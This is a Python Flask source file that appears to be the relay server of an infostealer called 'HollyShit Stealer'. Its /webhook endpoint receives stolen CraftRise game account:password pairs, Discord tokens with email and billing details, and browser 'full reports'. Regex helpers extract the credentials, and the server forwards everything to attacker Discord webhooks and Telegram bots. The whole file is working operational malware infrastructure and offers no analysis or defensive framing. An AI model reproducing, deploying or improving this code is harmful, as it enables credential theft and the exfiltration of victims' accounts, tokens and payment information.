from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

def send_discord(url, data):
    if not url:
        return
    try:
        if isinstance(data, str):
            requests.post(url, json={"content": data}, timeout=30)
        else:
            requests.post(url, json=data, timeout=30)
    except Exception as e:
        print(f"Discord hatası: {e}")

def send_telegram(token, chat_id, msg):
    if token and chat_id and msg:
        try:
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except Exception as e:
            print(f"Telegram hatası: {e}")

def extract_craftrise_account(content):
    """CraftRise hesabını content'ten çıkar - sadece hesap:şifre"""
    match = re.search(r'`([^`]+)`', content)
    if match:
        return match.group(1)
    # Alternatif: __HollyShitCraftrise__\n`hesap:şifre` formatı
    lines = content.split('\n')
    for line in lines:
        if '`' in line and ':' in line:
            match = re.search(r'`([^`]+)`', line)
            if match:
                return match.group(1)
    return content

def extract_discord_info(content):
    """Discord token bilgilerini content'ten çıkar"""
    user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
    token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
    email_match = re.search(r'\*\*Email:\*\* `([^`]+)`', content)
    billing_match = re.search(r'\*\*Billing:\*\* `([^`]+)`', content)
    return {
        "user": user_match.group(1) if user_match else "Unknown",
        "token": token_match.group(1) if token_match else "Unknown",
        "email": email_match.group(1) if email_match else "Unknown",
        "billing": billing_match.group(1) if billing_match else "None"
    }

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE ============
        if log_type == "craftrise":
            payload = data.get("data", data)
            # Discord'a gönder
            send_discord(CRAFTRISE_WEBHOOK, payload)
            
            # Telegram'a SADECE HESAP BİLGİSİ gönder (başka şey yok)
            content = payload.get("content", "")
            account = extract_craftrise_account(content)
            # Sadece "hesap:şifre" formatında gönder
            send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, account)
        
        # ============ DISCORD TOKEN ============
        elif log_type == "discord":
            payload = data.get("data", data)
            # Discord'a gönder
            send_discord(DISCORD_WEBHOOK, payload)
            
            # Telegram'a token bilgisi gönder
            content = payload.get("content", "")
            info = extract_discord_info(content)
            tg_msg = f"💎 **Discord Token!**\n\n👤 **User:** {info['user']}\n🔑 **Token:** `{info['token'][:40]}...`\n📧 **Email:** {info['email']}"
            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ BROWSER / MASTER ============
        else:
            payload = data.get("data", data)
            
            # 1. MASTER_WEBHOOK'a gönder
            send_discord(MASTER_WEBHOOK, payload)
            
            # 2. MASTER_TELEGRAM'a gönder (düz metin)
            tg_msg = "🕸️ **HOLLYSHIT STEALER - FULL REPORT**\n\n"
            content = payload.get("content", "")
            if content:
                tg_msg += f"{content}\n\n"
            
            embeds = payload.get("embeds", [])
            for embed in embeds:
                title = embed.get("title", "")
                if title:
                    tg_msg += f"**{title}**\n"
                fields = embed.get("fields", [])
                for field in fields:
                    name = field.get("name", "")
                    value = field.get("value", "")
                    value = re.sub(r'<[^>]+>', '', value)
                    value = re.sub(r'<a?:[a-zA-Z_]+:\d+>', '', value)
                    tg_msg += f"• {name}: {value}\n"
                tg_msg += "\n"
            
            if payload.get("url"):
                tg_msg += f"📥 **Download:** {payload['url']}\n"
            
            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg.strip())
            
            # 3. GLOBAL WEBHOOK ve TELEGRAM'a da gönder (WEBHOOK + TELEGRAM_TOKEN + TELEGRAM_CHAT_ID)
            # Discord Global
            send_discord(WEBHOOK, payload)
            
            # Telegram Global (aynı mesajı gönder)
            send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, tg_msg.strip())
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
